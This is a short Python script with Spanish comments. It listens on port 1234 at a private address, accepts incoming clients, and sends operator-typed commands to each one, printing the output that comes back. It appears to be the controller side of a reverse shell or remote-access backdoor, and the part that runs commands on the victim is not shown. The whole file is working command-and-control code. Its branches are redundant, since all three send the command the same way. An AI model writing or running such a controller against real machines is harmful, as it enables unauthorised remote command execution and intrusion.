import socket
import subprocess

def aceptar_conexiones():
    host = '192.168.1.95'
    port = 1234 # Puerto por el que se transmite la información

    # Crear socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Crea el socket diciendo que se conecta a IPv4 y TCP

    # Enlazar
    s.bind((host, port)) # Establece la conexión entre el host y el puerto

    # Aceptar conexiones
    s.listen(10) # Acepta un número máximo de conexiones
    print("Esperando conexiones en el puerto: " + str(port))

    while True:
        conn, addr = s.accept() # Acepta la conexión de un cliente
        print("Conectado a " + addr[0])
        comandos(conn) # Manda al cliente órdenes para ejecutar comandos (ejemplo: ipconfig)
        conn.close()

def comandos(conn):
    while True:
        cmd = input("Command> ")

        if cmd == '!info':
            conn.send(cmd.encode()) # Envía el comando
        elif cmd == 'si':
            conn.send(cmd.encode()) # Envía el comando
        else:
            conn.send(cmd.encode()) # Envía el comando
        respuesta = conn.recv(1024).decode() # Recibe la respuesta
        print(respuesta) # Imprime la respuesta
        
aceptar_conexiones()
